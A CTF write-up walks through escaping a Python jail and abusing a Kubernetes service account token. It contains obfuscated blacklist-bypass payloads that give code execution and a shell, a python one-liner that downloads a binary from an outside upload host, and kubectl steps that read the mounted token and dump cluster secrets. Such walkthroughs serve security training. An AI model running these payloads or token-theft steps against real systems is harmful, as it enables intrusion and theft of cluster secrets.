---
title: "InCTF Pro 21 Finals - PyJail K8"
classes: wide
tag: 
  - "ctf"
  - "kubernetes"
header:
  teaser: /assets/images/ctf/ctf.png
ribbon: green
description: "A walkthrough on kubernetes challenge from InCTF Pro 21 Finals"
categories:
  - Blog
---

This is an interesting challenge based on Kubernetes pod security, which allows a normal user to view sensitive data if he has access to K8's service account JWT token

While connecting to the server, it displays a simple PyJail. PyJail is like a sandboxed program where you can run commands with restriction & limited access

Lets connect to the server,

```c
┌──(kali㉿kali)-[~]
└─$ nc 34.93.14.197 31337
Hi! Welcome to pyjail!
def main():
    print("Hi! Welcome to pyjail!")
    print(open(__file__).read())
    print("RUN")
    text = input('>>> ')
    for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write','process','socket','help']:
        if keyword in text.lower():
            print("No!!!")
            return;
    else:
        exec(text)
if __name__ == "__main__":
    main()
RUN
>>> 
```

It seems like, our inputs are being executed by ```exec()``` in Python

But, most of the useful commands like 'eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write','process','socket','help' are blacklisted

It is always a good idea to start fuzzing the PyJail programs with SSTI (Server Side Template Injection) payloads. Sometimes, some payload may give some result

Also, we can use string concatenation and other functions to bypass these restrictions (depends on the program)

Lets start our fuzzing for our perfect payload with ```__builtins__```

```c
┌──(kali㉿kali)-[~]
└─$ nc 34.93.14.197 31337
Hi! Welcome to pyjail!
def main():
    print("Hi! Welcome to pyjail!")
    print(open(__file__).read())
    print("RUN")
    text = input('>>> ')
    for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write','process','socket','help']:
        if keyword in text.lower():
            print("No!!!")
            return;
    else:
        exec(text)
if __name__ == "__main__":
    main()
RUN
>>> print(__builtins__)
<module 'builtins' (built-in)>
```

From ```__builtins__``` lets try importing modules to call their function

Our payload to get RCE is,

```c
print(getattr(getattr(globals()['__builtins__'],'__im'+'port__')('o'+'s'),'sys'+'tem')('whoami'))
```

Passing this payload on the server to get arbitrary RCE

```c
┌──(kali㉿kali)-[~]
└─$ nc 34.93.14.197 31337
Hi! Welcome to pyjail!
def main():
    print("Hi! Welcome to pyjail!")
    print(open(__file__).read())
    print("RUN")
    text = input('>>> ')
    for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write','process','socket','help']:
        if keyword in text.lower():
            print("No!!!")
            return;
    else:
        exec(text)
if __name__ == "__main__":
    main()
RUN
>>> print(getattr(getattr(globals()['__builtins__'],'__im'+'port__')('o'+'s'),'sys'+'tem')('whoami'))
nobody
0
```

Enumerating with other commands,

```c
...

RUN
>>> print(getattr(getattr(globals()['__builtins__'],'__im'+'port__')('o'+'s'),'sys'+'tem')('id'))
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
0

...

RUN
>>> print(getattr(getattr(globals()['__builtins__'],'__im'+'port__')('o'+'s'),'sys'+'tem')('uname -a'))
Linux inctf-python-jail-56b4f88577-xhc7w 5.4.144+ #1 SMP Tue Sep 28 10:08:22 PDT 2021 x86_64 x86_64 x86_64 GNU/Linux
0

```

So we are able to perform RCE on the server. Its time to gain foothold by spawning shell on the server,

Payload to spawn shell (Thanks to ```h4x5p4c3```)

```c
getattr(getattr(getattr(main, '__globals__')['__builtins__'], '\x65\x78\x65\x63')('\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\57\142\151\156\57\163\150\47\51'))
```

Passing this payload to the server,

```c
...

RUN
>>> getattr(getattr(getattr(main, '__globals__')['__builtins__'], '\x65\x78\x65\x63')('\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\57\142\151\156\57\163\150\47\51'))
id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
whoami
nobody
```

Converting it into Pseudo Shell,

```c
python3 -c "import pty;pty.spawn('/bin/bash')"
bash: /root/.bashrc: Permission denied
nobody@inctf-python-jail-56b4f88577-hrgt6:/$ id
id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
```

After running ```ps```, we know that the python script running on server is at ```/app/```

Getting our flag for our first challenge,

```c
nobody@inctf-python-jail-56b4f88577-hrgt6:/$ cd app
cd app
nobody@inctf-python-jail-56b4f88577-hrgt6:/app$ ls
ls
chall.py  flag.txt
nobody@inctf-python-jail-56b4f88577-hrgt6:/app$ cat flag.txt
cat flag.txt
inctf{pyth0n_jail_is_fun_ri8}
```

For now, we have only completed the first half of the K8 challenge

There is much more to do on this Kubernetes Pod after gaining Shell/RCE

The description of this challenge is given,

```
hope you escaped python from jail,now try to find the secrets of k8s
```

They have mentioned about Secrets of K8, and actually there are some [information](https://kubernetes.io/docs/concepts/configuration/secret/) about it

Lets try to enumerate K8's secret,

Checking the mount file system,

```c
$ mount | grep kubernetes
mount | grep kubernetes
tmpfs on /run/secrets/kubernetes.io/serviceaccount type tmpfs (ro,relatime)
```

There is something on ```/run/secrets/kubernetes.io/serviceaccount```

Listing it,

```c
$ ls -la /run/secrets/kubernetes.io/serviceaccount
ls -la /run/secrets/kubernetes.io/serviceaccount
total 4
drwxrwxrwt 3 root root  140 Jan  9 05:56 .
drwxr-xr-x 3 root root 4096 Jan  8 08:02 ..
drwxr-xr-x 2 root root  100 Jan  9 05:56 ..2022_01_09_05_56_47.741267893
lrwxrwxrwx 1 root root   31 Jan  9 05:56 ..data -> ..2022_01_09_05_56_47.741267893
lrwxrwxrwx 1 root root   13 Jan  8 08:02 ca.crt -> ..data/ca.crt
lrwxrwxrwx 1 root root   16 Jan  8 08:02 namespace -> ..data/namespace
lrwxrwxrwx 1 root root   12 Jan  8 08:02 token -> ..data/token
```

Here we can confirm that these are service account's secret

And we can find ```token``` which is a JWT token, used for authorization 

Using this we can enumerate more about the kubernetes cluster, using ```kubectl```

Viewing the JWT token and setting it into a variable,

```c
$ cat /run/secrets/kubernetes.io/serviceaccount/token
cat /run/secrets/kubernetes.io/serviceaccount/token
<JWT TOKEN VALUE>

$ token=<JWT TOKEN VALUE>
```

Download ```kubectl``` from [here](https://storage.googleapis.com/kubernetes-release/release/v1.5.3/bin/linux/amd64/kubectl)

Since we don't have ```wget``` and ```curl```, we need to use a python oneliner to download ```kubectl```,

```c
$ cd /tmp
cd /tmp
$ python3 -c "import urllib.request;urllib.request.urlretrieve('http://bashupload.com/qPWJS/kubectl','kubectl')"
python3 -c "import urllib.request;urllib.request.urlretrieve('http://bashupload.com/qPWJS/kubectl','kubectl')"
$ ls -la
ls -la
total 49188
drwxrwxrwt 1 root   root        4096 Jan  9 06:22 .
drwxr-xr-x 1 root   root        4096 Jan  8 08:02 ..
-rw-r--r-- 1 nobody nogroup 50359943 Jan  9 06:22 kubectl
$ chmod +x kubectl
chmod +x kubectl
$ ls -la
ls -la
total 49188
drwxrwxrwt 1 root   root        4096 Jan  9 06:22 .
drwxr-xr-x 1 root   root        4096 Jan  8 08:02 ..
-rwxr-xr-x 1 nobody nogroup 50359943 Jan  9 06:22 kubectl
```

Now we should be able to run ```kubectl``` inside ```/tmp```,

```c
$ ./kubectl
./kubectl
kubectl controls the Kubernetes cluster manager. 

Find more information at https://github.com/kubernetes/kubernetes.

Basic Commands (Beginner):
  create         Create a resource by filename or stdin
  expose         Take a replication controller, service, deployment or pod and expose it as a new Kubernetes Service
  run            Run a particular image on the cluster
  set            Set specific features on objects

...

```

Configuring ```KUBECONFIG``` along with our, Service Account Token

```c
$ touch /tmp/c
touch /tmp/c
$ KUBECONFIG=/tmp/c /tmp/kubectl config set-credentials foo --token=$token
KUBECONFIG=/tmp/c /tmp/kubectl config set-credentials foo --token=$token
User "foo" set.
```

Getting ```namespaces```,

```c
$ KUBECONFIG=/tmp/c /tmp/kubectl get ns
KUBECONFIG=/tmp/c /tmp/kubectl get ns
NAME                     STATUS    AGE
default                  Active    4d
kube-node-lease          Active    4d
kube-public              Active    4d
kube-system              Active    4d
super-secret-namespace   Active    4d
```

There is an interesting namespace ```super-secret-namespace```

Lets try viewing secrets for this namespace,

```c
$ KUBECONFIG=/tmp/c /tmp/kubectl --namespace=super-secret-namespace get secrets
KUBECONFIG=/tmp/c /tmp/kubectl --namespace=super-secret-namespace get secrets
NAME                  TYPE                                  DATA      AGE
default-token-8pzrw   kubernetes.io/service-account-token   3         4d
ulta-secure-secret    Opaque                                1         3d
$ KUBECONFIG=/tmp/c /tmp/kubectl --namespace=super-secret-namespace get secrets ulta-secure-secret
KUBECONFIG=/tmp/c /tmp/kubectl --namespace=super-secret-namespace get secrets ulta-secure-secret
NAME                 TYPE      DATA      AGE
ulta-secure-secret   Opaque    1         3d
```

There is an ```Opaque``` secret type named ```ulta-secure-secret```,

Dumping that secret as YAML,

```c
$ KUBECONFIG=/tmp/c /tmp/kubectl --namespace=super-secret-namespace get secrets ulta-secure-secret -o yaml
KUBECONFIG=/tmp/c /tmp/kubectl --namespace=super-secret-namespace get secrets ulta-secure-secret -o yaml
apiVersion: v1
data:
  hmm: aW5jdGZ7V293X3lvdV9rbm93X0s4c192M3J5X3czbGxfZ2dfOil9
kind: Secret
metadata:
  annotations:
    kubectl.kubernetes.io/last-applied-configuration: |
      {"apiVersion":"v1","data":{"hmm":"aW5jdGZ7V293X3lvdV9rbm93X0s4c192M3J5X3czbGxfZ2dfOil9"},"kind":"Secret","metadata":{"annotations":{},"name":"ulta-secure-secret","namespace":"super-secret-namespace"},"type":"Opaque"}
  creationTimestamp: 2022-01-05T13:51:28Z
  managedFields:
  - apiVersion: v1
    fieldsType: FieldsV1
    fieldsV1:
      f:data:
        .: {}
        f:hmm: {}
      f:metadata:
        f:annotations:
          .: {}
          f:kubectl.kubernetes.io/last-applied-configuration: {}
      f:type: {}
    manager: kubectl-client-side-apply
    operation: Update
    time: 2022-01-05T13:51:28Z
  name: ulta-secure-secret
  namespace: super-secret-namespace
  resourceVersion: "593287"
  uid: cdbfe665-b3c5-47b4-97c0-5a93f0cdd193
type: Opaque
```

Decoding that interesting string with base64,

```c
echo aW5jdGZ7V293X3lvdV9rbm93X0s4c192M3J5X3czbGxfZ2dfOil9 | base64 -d
inctf{Wow_you_know_K8s_v3ry_w3ll_gg_:)}
```

For more reference,

[BSides CTF - Pwning CTF Infra - Blog](https://hackernoon.com/capturing-all-the-flags-in-bsidessf-ctf-by-pwning-our-infrastructure-3570b99b4dd0)

[BSides CTF - Pwning CTF Infra - Gist](https://gist.github.com/tmc/8cd2364f7b6702ac6318c64a3d17e32d)
